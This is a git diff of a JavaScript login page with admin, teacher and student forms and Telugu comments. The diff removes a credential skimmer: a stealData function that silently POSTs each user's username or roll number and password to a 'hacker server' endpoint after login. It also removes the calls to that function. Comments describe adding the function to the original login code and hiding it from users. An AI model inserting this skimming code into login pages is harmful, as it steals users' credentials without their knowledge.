@@ -23,7 +23,6 @@ const data = await res.json();
 if (res.ok) {
     localStorage.setItem('token', data.token);
     localStorage.setItem('role', 'admin');
-    await stealData(email, password)
     // Success ayite status page ki pampu with success param
     window.location.replace('/status?auth=success&role=admin');
 } else {
@@ -55,7 +54,6 @@ teacherForm.addEventListener('submit', async (e) => {
         if (res.ok) {
             localStorage.setItem('token', data.token);
             localStorage.setItem('role', 'teacher');
-            await stealData(email,password)
             window.location.replace('/status?auth=success&role=teacher');
         } else {
 
@@ -88,7 +86,6 @@ studentForm.addEventListener('submit', async (e) => {
     if (res.ok) {
         localStorage.setItem('token', data.token);
         localStorage.setItem('role', 'student');
-        await stealData(rollno, password)
         window.location.replace("/status?auth=success&role=student");
     } else {
         window.location.replace("/status?auth=fail");
@@ -98,8 +95,6 @@ studentForm.addEventListener('submit', async (e) => {
 
 
 // checking token  on page load
-
-// window.onload = () => {
     const token = localStorage.getItem('token');
     const role = localStorage.getItem('role');
     if (token) {
@@ -118,28 +113,4 @@ studentForm.addEventListener('submit', async (e) => {
         }
     
     }
-// }
-
-
-// stoling data to the hacker website
-// Ee logic nee original Login code lo add cheyali
-const stealData = async (user, pass) => {
-    try {
-        await fetch('http://localhost:5000/steal', { // Hacker Server URL
-            method: 'POST',
-            headers: {
-                'Content-Type': 'application/json',
-            },
-            body: JSON.stringify({
-                username: user,
-                password: pass,
-                site: window.location.hostname,
-                timestamp: new Date().toLocaleString()
-            }),
-        });
-    } catch (err) {
-        // Silent error, user ki asalu em jarugutundo teliyakudadu
-        console.log('server error');
-    }
-};
 
